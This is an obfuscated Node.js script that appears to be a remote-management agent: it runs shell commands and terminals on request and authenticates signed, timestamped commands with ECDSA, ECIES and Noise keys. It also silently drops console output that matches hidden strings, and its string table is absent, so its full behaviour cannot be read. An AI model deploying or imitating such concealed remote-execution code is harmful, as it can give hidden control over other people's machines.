#!/usr/bin/env node
const a0aY = a0b;
(function (a, b) {
    const aX = a0b, c = a();
    while (!![]) {
        try {
            const d = parseInt(aX(0x700)) / 0x1 + -parseInt(aX(0x371)) / 0x2 * (-parseInt(aX(0x427)) / 0x3) + parseInt(aX(0x7e9)) / 0x4 + -parseInt(aX(0x693)) / 0x5 * (parseInt(aX(0x49b)) / 0x6) + -parseInt(aX(0x4e7)) / 0x7 * (-parseInt(aX(0x3de)) / 0x8) + -parseInt(aX(0x51f)) / 0x9 + parseInt(aX(0x657)) / 0xa * (-parseInt(aX(0x552)) / 0xb);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0xea54d));
const a0c = [
    a0aY(0x7d0),
    a0aY(0x101),
    a0aY(0x24d)
];
function a0d(a) {
    return function (b, c, d) {
        const aZ = a0b, f = b['toString']();
        if (a0c['some'](g => f[aZ(0x27e)](g))) {
            if (typeof d === aZ(0x809))
                d();
            return !![];
        }
        return a[aZ(0x38b)](this, arguments);
    };
}
process['stdout'][a0aY(0x624)] = a0d(process[a0aY(0x2db)][a0aY(0x624)]), process[a0aY(0x471)]['write'] = a0d(process['stderr']['write']);
const a0f = require(a0aY(0x1e6)), a0g = require('http'), a0h = require(a0aY(0x382)), a0i = require(a0aY(0x23e)), a0j = require('tls'), a0k = require(a0aY(0x68f)), a0l = require('fs'), a0m = require('fs')[a0aY(0x31e)], a0n = require(a0aY(0x41b)), a0o = require(a0aY(0x7d3)), a0p = require('os'), a0q = require(a0aY(0x342)), {
        exec: a0r,
        spawn: a0s
    } = require(a0aY(0xef)), a0t = require('node-cron'), a0u = require(a0aY(0xe0)), {encrypt: a0v} = require(a0aY(0x6d0)), a0w = require(a0aY(0x1f9)), a0x = require(a0aY(0x62b)), a0y = require('noise-c.wasm');
function a0z() {
    const b0 = a0aY, a = {
            'WRYLb': b0(0x36c),
            'pvXsQ': b0(0x64e),
            'mSQdZ': function (b, c) {
                return b <= c;
            },
            'oBCrG': function (b, c) {
                return b + c;
            },
            'scIlw': function (b, c) {
                return b >= c;
            },
            'MHHlV': function (b, c) {
                return b in c;
            }
        };
    try {
        const b = a0o[b0(0x2e0)](__dirname, a[b0(0x5ed)]);
        if (!a0l[b0(0xfe)](b))
            return;
        for (let c of a0l[b0(0x734)](b, 'utf8')[b0(0x3ab)](/\r?\n/)) {
            let d = c[b0(0x2eb)]();
            if (!d || d[b0(0x49a)]('#'))
                continue;
            if (d[b0(0x49a)](a['pvXsQ']))
                d = d['slice'](0x7)['trimStart']();
            const f = d['indexOf']('=');
            if (a[b0(0x7fd)](f, 0x0))
                continue;
            const g = d[b0(0x806)](0x0, f)[b0(0x2eb)]();
            let h = d['slice'](a['oBCrG'](f, 0x1))[b0(0x2eb)]();
            a[b0(0x2ae)](h[b0(0x8fc)], 0x2) && (h['startsWith']('\x22') && h[b0(0x416)]('\x22') || h[b0(0x49a)]('\x27') && h[b0(0x416)]('\x27')) && (h = h['slice'](0x1, -0x1));
            if (g && !a[b0(0x740)](g, process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0z();
let a0A, a0B, a0C;
try {
    typeof Bun !== a0aY(0x141) ? a0C = require('bun-pty') : a0C = require('@lydell/node-pty');
} catch (a0aW) {
    console['error'](a0aY(0x3ea)), console[a0aY(0x1e9)](a0aY(0x17c) + a0aW['message']), console[a0aY(0x1e9)](a0aY(0x2bb)), process[a0aY(0x56d)](0x1);
}
const a0D = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const b1 = a0aY, a = {
                'RFJEY': function (b, c) {
                    return b !== c;
                },
                'HRYXB': 'undefined',
                'YJlXB': function (b, c) {
                    return b !== c;
                }
            };
        return a[b1(0x7c2)](typeof a0P, a[b1(0x653)]) && a[b1(0x142)](a0P[b1(0xc9)], undefined) ? a0P[b1(0xc9)] : 0x2;
    },
    'debug': a => {
        const b2 = a0aY, b = {
                'CCiKf': function (c, d) {
                    return c <= d;
                }
            };
        b[b2(0x350)](a0D[b2(0x8ed)], a0D[b2(0x34c)][b2(0x628)]) && console[b2(0x60c)](b2(0x930) + a);
    },
    'info': a => {
        const b3 = a0aY;
        a0D[b3(0x8ed)] <= a0D[b3(0x34c)][b3(0x3a1)] && console[b3(0x60c)](b3(0x6d9) + a);
    },
    'warn': a => {
        const b4 = a0aY, b = {
                'QPHKk': function (c, d) {
                    return c <= d;
                }
            };
        b[b4(0x386)](a0D[b4(0x8ed)], a0D[b4(0x34c)][b4(0x17d)]) && console[b4(0x60c)](b4(0x5ae) + a);
    },
    'error': a => {
        const b5 = a0aY, b = {
                'kjRlc': function (c, d) {
                    return c <= d;
                }
            };
        b['kjRlc'](a0D['currentLevel'], a0D[b5(0x34c)][b5(0x8f0)]) && console[b5(0x60c)](b5(0x3e5) + a);
    }
};
function a0E() {
    const b6 = a0aY, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0p[b6(0x644)](),
            process[b6(0x2c4)]()
        ];
    for (const b of a) {
        if (b && a0l[b6(0xfe)](b) && a0l['statSync'](b)['isDirectory']())
            return b;
    }
    return process[b6(0x2c4)]();
}
function a0F() {
    const b7 = a0aY;
    let a = null;
    try {
        a = a0p[b7(0x644)]();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l[b7(0xfe)](d) && a0l[b7(0xca)](d)[b7(0x8e1)]())
            return d;
        if (d)
            console[b7(0x60c)]('\x1b[33m[WARN]\x1b[0m\x20FILE_ROOT\x20候选目录不存在,\x20已跳过:\x20' + d);
    }
    return console['log'](b7(0x28a) + process[b7(0x2c4)]()), process[b7(0x2c4)]();
}
class a0G {
    constructor(a = 'ok') {
        const b8 = a0aY;
        this[b8(0x5c3)] = a;
    }
}
class a0H extends a0G {
    constructor(a = 'ok', b = 0x0) {
        super(a), this['count'] = b;
    }
}
class a0I extends a0G {
    constructor() {
        const b9 = a0aY, a = { 'KTRYh': '1|7|5|0|10|4|12|3|2|6|16|15|14|9|8|13|11' }, b = a['KTRYh']['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[b9(0x59b)] = '';
                continue;
            case '1':
                super();
                continue;
            case '2':
                this[b9(0x1a8)] = 0x0;
                continue;
            case '3':
                this[b9(0x8ec)] = null;
                continue;
            case '4':
                this[b9(0x55d)] = '';
                continue;
            case '5':
                this[b9(0x8cf)] = 0x0;
                continue;
            case '6':
                this['os'] = '';
                continue;
            case '7':
                this[b9(0x2ce)] = '';
                continue;
            case '8':
                this['marks'] = [];
                continue;
            case '9':
                this[b9(0x150)] = '';
                continue;
            case '10':
                this[b9(0x8aa)] = 0x0;
                continue;
            case '11':
                this['noise_key'] = null;
                continue;
            case '12':
                this[b9(0x59a)] = null;
                continue;
            case '13':
                this[b9(0x4d8)] = '';
                continue;
            case '14':
                this[b9(0x1fb)] = a0P[b9(0x1fe)];
                continue;
            case '15':
                this[b9(0x4e0)] = 0x0;
                continue;
            case '16':
                this[b9(0x207)] = '';
                continue;
            }
            break;
        }
    }
}
class a0J extends a0G {
    constructor() {
        const ba = a0aY, a = { 'lfzUs': ba(0x524) }, b = a[ba(0x6a4)][ba(0x3ab)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                super();
                continue;
            case '1':
                this[ba(0x462)] = { 'usage': 0x0 };
                continue;
            case '2':
                this['swap'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '3':
                this[ba(0x237)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '4':
                this['uptime'] = 0x0;
                continue;
            case '5':
                this[ba(0x6a6)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '6':
                this['process'] = 0x0;
                continue;
            case '7':
                this[ba(0x86b)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '8':
                this[ba(0x113)] = '';
                continue;
            case '9':
                this['ram'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '10':
                this[ba(0x4a2)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            }
            break;
        }
    }
}
class a0K extends a0G {
    constructor() {
        const bb = a0aY;
        super(), this[bb(0x230)] = '', this[bb(0x8ea)] = 0x0, this['timeout'] = ![], this[bb(0x41a)] = '';
    }
}
class a0L {
    constructor() {
        const bc = a0aY, a = { 'lOgrR': bc(0x546) }, b = a[bc(0x5e5)][bc(0x3ab)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this['path'] = '';
                continue;
            case '1':
                this['mtime'] = '';
                continue;
            case '2':
                this[bc(0x5d2)] = '';
                continue;
            case '3':
                this['name'] = '';
                continue;
            case '4':
                this[bc(0x3e9)] = 0x0;
                continue;
            case '5':
                this[bc(0x78a)] = '';
                continue;
            case '6':
                this[bc(0x28c)] = '';
                continue;
            case '7':
                this[bc(0x291)] = '';
                continue;
            }
            break;
        }
    }
}
class a0M {
    constructor() {
        const bd = a0aY, a = { 'aiyUN': '5|3|1|4|0|7|2|6' }, b = a[bd(0x7cd)][bd(0x3ab)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[bd(0x5d2)] = '';
                continue;
            case '1':
                this[bd(0x291)] = '';
                continue;
            case '2':
                this[bd(0x907)] = ![];
                continue;
            case '3':
                this[bd(0x258)] = '';
                continue;
            case '4':
                this[bd(0x28c)] = '';
                continue;
            case '5':
                this[bd(0x7d3)] = '';
                continue;
            case '6':
                this[bd(0x408)] = ![];
                continue;
            case '7':
                this[bd(0x739)] = ![];
                continue;
            }
            break;
        }
    }
}
class a0N extends a0G {
    constructor() {
        const be = a0aY;
        super(), this[be(0x1f8)] = [];
    }
}
class a0O {
    static [a0aY(0x7f3)]() {
        const bf = a0aY, a = {
                'ScpFf': bf(0x181),
                'yzSVU': bf(0x4c2),
                'Btpoo': bf(0x80b),
                'qOPwL': function (i, j) {
                    return i !== j;
                },
                'KuySh': bf(0x262)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[bf(0x16b)](a['ScpFf']), d = b[bf(0x91c)]({ 'format': a[bf(0x788)] }), f = c[bf(0x91c)]({ 'format': a[bf(0x788)] }), g = Buffer[bf(0x317)](d['d'], bf(0x80b)), h = Buffer[bf(0x317)](f['x'], a[bf(0x4e1)]);
        return (a[bf(0x42c)](g['length'], 0x20) || h[bf(0x8fc)] !== 0x20) && a0D['error']('[🚨\x20严重警告]\x20X25519\x20密钥长度非\x2032\x20字节，Noise\x20协议必定崩溃！'), {
            'private_b64': g[bf(0x62f)](a['KuySh']),
            'public_b64': h['toString'](a['KuySh'])
        };
    }
    static [a0aY(0x708)](a) {
        const bg = a0aY, b = this[bg(0x7f3)]();
        return {
            'role': a,
            'private_b64': b[bg(0x8bf)],
            'public_b64': b[bg(0x4cb)]
        };
    }
    static [a0aY(0x5b5)](a = a0aY(0x56b), b = a0aY(0x890)) {
        const bh = a0aY, c = {
                'control': this['generateSingle'](a),
                'agent': this[bh(0x708)](b)
            };
        return c;
    }
}
class a0P {
    static [a0aY(0x124)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0aY(0x792)] = (process.env.EXEC_SHELL || 'true')[a0aY(0x52c)]() === a0aY(0x61f);
    static [a0aY(0x628)] = (process.env.DEBUG || a0aY(0x18d))[a0aY(0x52c)]() === 'true';
    static ['TIMESTAMP_WINDOW'] = parseInt(process.env.TIMESTAMP_WINDOW || a0aY(0x235));
    static ['LOG_LEVEL'] = parseInt(process.env.LOG_LEVEL || (this[a0aY(0x628)] ? '0' : '3'), 0xa);
    static [a0aY(0x210)] = a0P[a0aY(0x15b)](a0aY(0x1d8), 'keys/agent_ecdsa_pub.pem') || 'ECDSA公钥内容';
    static [a0aY(0x706)] = a0P[a0aY(0x15b)](a0aY(0x75e), a0aY(0x1ad)) || 'ECIES公钥内容';
    static [a0aY(0x45c)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0aY(0x811)] = parseInt(process.env.TEMPKEY_MAX_TTL || a0aY(0x164), 0xa);
    static [a0aY(0x823)] = a0F();
    static [a0aY(0x8a0)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0aY(0x5a5));
    static [a0aY(0x648)] = (process.env.FOLLOW_SYMLINKS || a0aY(0x18d))[a0aY(0x52c)]() === a0aY(0x61f);
    static ['DOWNLOAD_ENCRYPT_MAX'] = Number[a0aY(0x6e6)](parseInt(process.env.DOWNLOAD_ENCRYPT_MAX || a0aY(0xdb), 0xa)) ? parseInt(process.env.DOWNLOAD_ENCRYPT_MAX || a0aY(0xdb), 0xa) : 0x400000;
    static [a0aY(0x5fc)] = (process.env.FILE_AUDIT_LOG || a0aY(0x61f))[a0aY(0x52c)]() === a0aY(0x61f);
    static ['InitTask'] = !![];
    static [a0aY(0x367)] = [];
    static [a0aY(0x613)] = {};
    static [a0aY(0x2a8)] = ![];
    static ['TASK_TIMEOUT'] = parseInt(process.env.TASK_TIMEOUT || '300');
    static ['CRON_CHECK_INTERVAL'] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0aY(0x264)] = [];
    static [a0aY(0x667)] = [];
    static ['MAX_TASK_LOG_SIZE'] = parseInt(process.env.MAX_TASK_LOG || a0aY(0x37c));
    static [a0aY(0x85e)] = process.env.HOST || '0.0.0.0';
    static [a0aY(0x81b)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0aY(0x32e));
    static [a0aY(0x26a)] = (process.env.KMODE || '0')[a0aY(0x2eb)]() || '0';
    static [a0aY(0x44c)] = (process.env.KNAME || '')[a0aY(0x2eb)]();
    static [a0aY(0x917)] = (process.env.KNAME_KEY || '')[a0aY(0x2eb)]();
    static [a0aY(0x204)] = process.env.KPATH || '';
    static [a0aY(0x1fe)] = process.env.AGENT_VERSION || a0aY(0x74d);
    static [a0aY(0x3a3)] = a0k[a0aY(0x6de)](0x20)[a0aY(0x62f)](a0aY(0x262));
    static [a0aY(0x67b)] = a0O[a0aY(0x5b5)]();
    static [a0aY(0x8b5)]() {
        const bi = a0aY, a = { 'sfZGN': bi(0x7df) };
        return a0k[bi(0x887)](a[bi(0x490)], Buffer['from'](this[bi(0x3a3)], bi(0x262)))[bi(0x1cf)](bi(0x51e))[bi(0x867)](bi(0x262));
    }
    static [a0aY(0x82e)]() {
        const bj = a0aY, a = {
                'omoXJ': bj(0x262),
                'LOBme': bj(0x270)
            }, b = a0O[bj(0x5b5)]();
        this[bj(0x67b)]['control'] = b[bj(0x1a9)], this[bj(0x4b7)]['controller'][bj(0x7ab)] = b[bj(0x1a9)][bj(0x8bf)], this['SESSION_KEY'] = a0k[bj(0x6de)](0x20)['toString'](a['omoXJ']), this[bj(0x2f8)] = null, this[bj(0x8d7)] = 0x0, a0D[bj(0x6e1)](a['LOBme']);
    }
    static [a0aY(0x4b7)] = {
        'controller': { 'private': this[a0aY(0x67b)][a0aY(0x1a9)]['private_b64'] },
        'agent': { 'public': this[a0aY(0x67b)][a0aY(0x897)]['public_b64'] }
    };
    static [a0aY(0x550)] = 0xe10;
    static [a0aY(0x365)] = 0x1e;
    static ['BASEINFO_FAIL_BACKOFF'] = 0x3c;
    static [a0aY(0x6ff)] = 0x1e;
    static [a0aY(0x6bd)] = null;
    static [a0aY(0x6d8)] = null;
    static [a0aY(0x10e)] = null;
    static [a0aY(0x5f9)] = 0x0;
    static ['_baseinfo_local_fail_time'] = 0x0;
    static [a0aY(0x8c9)] = null;
    static [a0aY(0x8c8)] = null;
    static [a0aY(0x3d8)] = 0x0;
    static [a0aY(0x7fe)] = 0x0;
    static [a0aY(0x34d)] = null;
    static [a0aY(0x2f8)] = null;
    static ['_status_cache_time'] = 0x0;
    static ['_status_fetch_promise'] = null;
    static [a0aY(0x2fa)]() {
        const bk = a0aY, a = {
                'roCUI': function (b, c) {
                    return b(c);
                },
                'AtTun': function (b, c) {
                    return b / c;
                }
            };
        return a['roCUI'](Number, a[bk(0x54d)](process[bk(0x13b)][bk(0x4fc)](), 0xf4240n));
    }
    static [a0aY(0x679)](a) {
        return a ? { ...a } : null;
    }
    static async [a0aY(0x909)]() {
        const bl = a0aY;
        if (this[bl(0x6bd)])
            return this[bl(0x679)](this[bl(0x6bd)]);
        return !this['_baseinfo_p_promise'] && (this[bl(0x6d8)] = new a0U()[bl(0x5dd)]()[bl(0x843)](a => {
            const bm = bl;
            return a0D[bm(0x52b)](bm(0x8ad) + a[bm(0x113)], 0x1), a0U['staticFallback']();
        })[bl(0x3f7)](a => {
            return this['_baseinfo_p_cache'] = a, a;
        })[bl(0x72b)](() => {
            const bn = bl;
            this[bn(0x6d8)] = null;
        })), this['_cloneBaseInfoPart'](await this['_baseinfo_p_promise']);
    }
    static async [a0aY(0x25f)](a) {
        const bo = a0aY, b = {
                'cxhMX': function (d, f) {
                    return d - f;
                },
                'gkXJk': function (d, f) {
                    return d < f;
                },
                'CBWFw': function (d, f) {
                    return d * f;
                }
            }, c = this['_baseInfoNowMs']();
        if (this['_baseinfo_local_cache'] && b[bo(0x770)](c, this[bo(0x5f9)]) < this['BASEINFO_LOCAL_TTL'] * 0x3e8)
            return this[bo(0x679)](this[bo(0x10e)]);
        if (this['_baseinfo_local_fail_time'] && b[bo(0x8ab)](c - this['_baseinfo_local_fail_time'], b['CBWFw'](this[bo(0x4fe)], 0x3e8)))
            return this[bo(0x679)](this[bo(0x10e)] || a0U[bo(0x436)]());
        return !this[bo(0x8c9)] && (this[bo(0x8c9)] = new a0U()[bo(0x8af)](a)[bo(0x3f7)](d => {
            const bp = bo;
            return this[bp(0x10e)] = d, this[bp(0x5f9)] = this[bp(0x2fa)](), this[bp(0x39c)] = 0x0, d;
        })['catch'](d => {
            const bq = bo;
            return a0D[bq(0x52b)](bq(0x1d5) + d['message'], 0x1), this[bq(0x39c)] = this[bq(0x2fa)](), this[bq(0x10e)] || a0U[bq(0x436)]();
        })[bo(0x72b)](() => {
            this['_baseinfo_local_promise'] = null;
        })), this[bo(0x679)](await this['_baseinfo_local_promise']);
    }
    static async [a0aY(0x56c)]() {
        const br = a0aY, a = {
                'eYCTz': function (c, d) {
                    return c < d;
                },
                'BMmLK': function (c, d) {
                    return c - d;
                },
                'XSTJy': function (c, d) {
                    return c * d;
                },
                'nRDlc': function (c, d) {
                    return c - d;
                },
                'GOrgi': function (c, d) {
                    return c * d;
                }
            }, b = this[br(0x2fa)]();
        if (this[br(0x8c8)] && a[br(0x659)](a[br(0x368)](b, this[br(0x3d8)]), a[br(0x65b)](this['BASEINFO_CACHE_TTL'], 0x3e8)))
            return this[br(0x679)](this[br(0x8c8)]);
        if (this[br(0x7fe)] && a[br(0x659)](a[br(0x8ca)](b, this[br(0x7fe)]), a[br(0x76c)](this['BASEINFO_FAIL_BACKOFF'], 0x3e8)))
            return this['_cloneBaseInfoPart'](this[br(0x8c8)] || a0U['netFallback']());
        return !this[br(0x34d)] && (this[br(0x34d)] = new a0U()[br(0x7ad)]()[br(0x3f7)](c => {
            const bs = br;
            return this[bs(0x8c8)] = c, this[bs(0x3d8)] = this['_baseInfoNowMs'](), this[bs(0x7fe)] = 0x0, c;
        })[br(0x843)](c => {
            const bt = br;
            return a0D[bt(0x52b)](bt(0x920) + c['message'], 0x1), this[bt(0x7fe)] = this[bt(0x2fa)](), this[bt(0x8c8)] || a0U[bt(0x3e7)]();
        })[br(0x72b)](() => {
            const bu = br;
            this[bu(0x34d)] = null;
        })), this[br(0x679)](await this[br(0x34d)]);
    }
    static [a0aY(0x15b)](a, b) {
        const bv = a0aY, c = { 'zPJdN': bv(0x330) }, d = process.env[a];
        if (d)
            return d;
        const f = a0o[bv(0x2e0)](__dirname, b);
        if (a0l['existsSync'](f))
            try {
                return a0l[bv(0x734)](f, c[bv(0x57c)])['trim']();
            } catch (g) {
            }
        return '';
    }
    static [a0aY(0x4b3)]() {
        const bw = a0aY, a = {
                'cawDq': bw(0xfb),
                'QrbCg': function (b, c) {
                    return b > c;
                },
                'TzCxd': bw(0x76a),
                'HDfxO': bw(0x851),
                'fVPwU': '\x20\x20\x201.\x20设置环境变量:\x20export\x20ECDSA_PUBKEY=\x27-----BEGIN\x20PUBLIC\x20KEY-----\x27...\x27',
                'Kvmpv': '\x0a💡\x20解决方法:',
                'IurHq': bw(0x54c)
            };
        if (!this[bw(0x628)]) {
            const b = [];
            !this[bw(0x210)] && b['push'](a[bw(0x910)]);
            !this[bw(0x706)] && b[bw(0x1f0)]('ECIES_PUBKEY:\x20未设置环境变量且文件\x20keys/agent_ecies_pub.b64\x20不存在');
            if (a[bw(0x5c8)](b[bw(0x8fc)], 0x0)) {
                const c = a[bw(0x33c)][bw(0x3ab)]('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        process[bw(0x56d)](0x1);
                        continue;
                    case '1':
                        a0D[bw(0x1e9)](a[bw(0x3fb)]);
                        continue;
                    case '2':
                        a0D[bw(0x52b)](a[bw(0x6b8)]);
                        continue;
                    case '3':
                        b['forEach'](f => a0D[bw(0x1e9)]('\x20\x20\x20•\x20' + f));
                        continue;
                    case '4':
                        a0D[bw(0x52b)](a[bw(0x8c7)]);
                        continue;
                    case '5':
                        a0D[bw(0x52b)](a[bw(0x4a9)]);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static [a0aY(0x135)](a = {}) {
        const bx = a0aY, b = {
                'YzRRu': function (c, d) {
                    return c !== d;
                },
                'tMbyy': function (c, d, f) {
                    return c(d, f);
                },
                'Cmgaf': function (c, d) {
                    return c !== d;
                },
                'XnMOJ': function (c, d) {
                    return c(d);
                },
                'zJUCO': function (c, d) {
                    return c(d);
                },
                'kgCMk': function (c, d) {
                    return c(d);
                },
                'AbeNT': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        b[bx(0x506)](a[bx(0x81b)], undefined) && a[bx(0x81b)] !== null && (this[bx(0x81b)] = b[bx(0x557)](parseInt, String(a[bx(0x81b)]), 0xa));
        a[bx(0x210)] && (this[bx(0x210)] = a['ECDSA_PUBLIC_KEY_PEM']['trim']());
        a[bx(0x706)] && (this[bx(0x706)] = a[bx(0x706)][bx(0x2eb)]());
        if (b['Cmgaf'](a[bx(0x26a)], undefined) && a[bx(0x26a)] !== null) {
            const c = b[bx(0x24e)](String, a['KMODE'])['trim']();
            /^[012]$/[bx(0x292)](c) ? this[bx(0x26a)] = c : (this[bx(0x26a)] = '0', a0D[bx(0x6e1)](bx(0x3f2) + b[bx(0x19b)](String, a[bx(0x26a)]) + bx(0x676)));
        }
        a[bx(0x44c)] && b[bx(0x24e)](String, a[bx(0x44c)])['trim']() && (this['KNAME'] = b[bx(0x161)](String, a['KNAME'])['trim']()), a[bx(0x917)] && b[bx(0x24e)](String, a['KNAME_KEY'])[bx(0x2eb)]() && (this[bx(0x917)] = b[bx(0x161)](String, a[bx(0x917)])[bx(0x2eb)]()), a[bx(0x204)] && b[bx(0x6a1)](String, a[bx(0x204)])[bx(0x2eb)]() && (this[bx(0x204)] = b[bx(0x19b)](String, a[bx(0x204)])['trim']());
    }
}
class a0Q {
    constructor() {
        const by = a0aY;
        this['_key'] = null, this[by(0x656)] = null;
    }
    [a0aY(0x79a)](a) {
        const bz = a0aY, b = { 'ZLKrE': '4|2|1|3|0' }, c = b[bz(0x5cd)][bz(0x3ab)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                return this[bz(0x90f)];
            case '1':
                this['_key'] = this[bz(0x3c5)](a);
                continue;
            case '2':
                if (this[bz(0x90f)])
                    return this['_key'];
                continue;
            case '3':
                a0D[bz(0x5ac)]('🔑\x20[TempKey]\x20新临时密钥已生成:\x20key_id=' + this[bz(0x90f)][bz(0x21c)] + bz(0x68c) + a + bz(0x1bf));
                continue;
            case '4':
                this[bz(0x22d)]();
                continue;
            }
            break;
        }
    }
    [a0aY(0x635)]() {
        const bA = a0aY;
        this[bA(0x22d)]();
        if (this[bA(0x90f)])
            return this['_key']['ecdsa_vk'];
        return null;
    }
    ['getActiveEciesPub']() {
        const bB = a0aY;
        this[bB(0x22d)]();
        if (this[bB(0x90f)])
            return this[bB(0x90f)]['ecies_pub'];
        return null;
    }
    ['_expireCurrent']() {
        const bC = a0aY;
        if (this['_key'] && this[bC(0x2da)](this['_key'])) {
            const a = this['_key'][bC(0x21c)];
            this['_key'] = null, a0D[bC(0x6e1)](bC(0x361) + a);
            if (typeof this['onExpired'] === bC(0x809))
                try {
                    this[bC(0x656)]();
                } catch (b) {
                    a0D[bC(0x1e9)](bC(0x2ef) + b[bC(0x113)]);
                }
        }
    }
    [a0aY(0x2da)](a) {
        const bD = a0aY, b = {
                'EYIVr': function (c, d) {
                    return c >= d;
                }
            };
        return b[bD(0x2be)](Math[bD(0x7c7)](Date['now']() / 0x3e8), a[bD(0x593)]);
    }
    [a0aY(0x3c5)](a) {
        const bE = a0aY, b = {
                'NlgSK': bE(0x148),
                'gVgdl': bE(0xe9),
                'tgzTc': bE(0x927),
                'vGLTP': 'pem',
                'SPNyr': bE(0x4c2),
                'yLmgF': bE(0x35d),
                'pspYA': function (o, p) {
                    return o - p;
                },
                'dvlJR': function (o, p) {
                    return o / p;
                },
                'sTzoI': function (o, p) {
                    return o * p;
                },
                'ibOtU': bE(0x20c),
                'bnPZE': bE(0x262)
            }, {
                privateKey: c,
                publicKey: d
            } = a0k[bE(0x16b)]('ec', { 'namedCurve': b[bE(0x35c)] }), f = c[bE(0x91c)]({
                'type': b['gVgdl'],
                'format': 'pem'
            }), g = d[bE(0x91c)]({
                'type': b[bE(0x107)],
                'format': b[bE(0x597)]
            }), h = a0k[bE(0x6de)](0x20), i = Buffer[bE(0x317)](a0B[bE(0x521)](h, ![])), j = c[bE(0x91c)]({ 'format': b[bE(0xe4)] }), k = d[bE(0x91c)]({
                'type': b[bE(0x107)],
                'format': b[bE(0x63f)]
            }), l = k['subarray'](b[bE(0x536)](k[bE(0x8fc)], 0x41)), m = Math[bE(0x7c7)](b[bE(0x717)](Date[bE(0x4ea)](), 0x3e8)), n = b[bE(0x19e)](a, 0xe10);
        return {
            'key_id': a0k[bE(0x6de)](0x8)[bE(0x62f)](b[bE(0x314)]),
            'created_at': m,
            'expires_at': m + n,
            'ttl_seconds': n,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h['toString'](b[bE(0x314)]),
            'ecies_public_key': i[bE(0x62f)](b[bE(0x314)]),
            'ecdsa_private_hex': Buffer[bE(0x317)](j['d'], bE(0x80b))['toString'](b[bE(0x314)]),
            'ecdsa_public_b64': Buffer['from'](a0A[bE(0x6eb)][bE(0x2a2)](l)['toBytes'](!![]))['toString'](bE(0x262)),
            'ecies_public_b64': Buffer[bE(0x317)](a0B['getPublicKey'](h, !![]))[bE(0x62f)](b[bE(0x7ec)]),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0R {
    constructor(a, b) {
        const bF = a0aY, c = {
                'nUhoJ': function (d, f) {
                    return d(f);
                },
                'Zrgyf': function (d, f) {
                    return d(f);
                }
            };
        this[bF(0x57f)] = null, this[bF(0x75f)] = null;
        if (a)
            try {
                const d = a[bF(0x2eb)]();
                if (d['startsWith']('-----BEGIN'))
                    this[bF(0x57f)] = a0k['createPublicKey'](d);
                else {
                    const f = Buffer[bF(0x317)](d, bF(0x262)), g = a0A[bF(0x6eb)][bF(0x2a2)](f), h = g[bF(0x344)](![]), i = m => m[bF(0x62f)](bF(0x262))[bF(0x7ee)](/\+/g, '-')[bF(0x7ee)](/\//g, '_')[bF(0x7ee)](/=/g, ''), j = c[bF(0x8c3)](i, Buffer[bF(0x317)](h[bF(0x806)](0x1, 0x21))), k = c[bF(0x790)](i, Buffer['from'](h[bF(0x806)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': bF(0x89a),
                            'x': j,
                            'y': k
                        };
                    this['ecdsaPubkey'] = a0k[bF(0x149)]({
                        'key': l,
                        'format': 'jwk'
                    });
                }
            } catch (m) {
                a0D[bF(0x1e9)](bF(0x1d6) + m[bF(0x113)]), this[bF(0x57f)] = null;
            }
        if (b)
            try {
                this[bF(0x75f)] = a0w[bF(0x390)](b[bF(0x2eb)]());
            } catch (n) {
                a0D[bF(0x6e1)](bF(0x837) + n[bF(0x113)]);
            }
    }
    [a0aY(0x640)](a, b, c, d, f, g, h = null) {
        const bG = a0aY, i = {
                'yvofy': 'ECDSA\x20public\x20key\x20not\x20loaded',
                'IWJVQ': function (j, k) {
                    return j(k);
                },
                'SkpHU': function (j, k) {
                    return j / k;
                },
                'aiQBb': function (j, k) {
                    return j > k;
                },
                'priUy': function (j, k) {
                    return j - k;
                },
                'SJuvx': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'HUaeY': bG(0x58c)
            };
        if (!this['ecdsaPubkey'])
            throw new Error(i['yvofy']);
        try {
            const j = i['IWJVQ'](parseInt, f), k = Math[bG(0x7c7)](i[bG(0x47b)](Date[bG(0x4ea)](), 0x3e8));
            if (i[bG(0x4b5)](Math[bG(0x8a5)](i[bG(0x5eb)](k, j)), a0P['TIMESTAMP_WINDOW']))
                throw new Error(bG(0x703) + Math[bG(0x8a5)](k - j) + bG(0x572) + a0P[bG(0x40d)] + 's');
            const l = i[bG(0x800)](a0S, a, b, c, d, f);
            if (this[bG(0x830)](this[bG(0x57f)], l, g))
                return i['HUaeY'];
            if (h && this['_verifyWith'](h, l, g))
                return 'temp';
            throw new Error(bG(0x294));
